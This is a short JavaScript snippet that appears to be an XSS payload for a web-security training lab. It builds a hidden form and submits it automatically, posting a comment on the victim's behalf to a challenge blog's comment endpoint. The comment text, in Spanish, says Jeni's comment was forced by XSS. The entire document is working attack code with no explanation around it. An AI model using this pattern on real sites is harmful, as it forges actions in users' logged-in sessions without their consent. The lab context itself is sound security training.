(function() {
    var comment_url = 'https://chl-73ceb839-441a-49fb-8c92-d05b95d6d961-blog-hacklab-v2.softwareseguro.com.ar/comment'; 

    var f = document.createElement('form');
    f.method = 'POST'; 
    f.action = comment_url; 
    
    var c = document.createElement('input');
    c.type = 'hidden';
    
    c.name = 'content'; 
    c.value = '¡Comentario de Jeni forzado por XSS!'; 
    
    f.appendChild(c);
    document.body.appendChild(f); 
    
    f.submit(); 
    
})();